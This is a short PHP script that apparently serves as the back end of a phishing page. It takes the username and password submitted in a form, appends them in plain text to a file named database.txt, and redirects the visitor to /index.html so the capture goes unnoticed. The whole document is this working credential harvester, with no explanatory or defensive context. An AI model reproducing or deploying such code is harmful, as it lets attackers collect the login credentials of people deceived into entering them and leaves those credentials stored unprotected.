<?php
$line = $_POST['username'].' '.$_POST['password'];
file_put_contents ('database.txt', PHP_EOL . $line, FILE_APPEND);
header ('Location: /index.html');
?>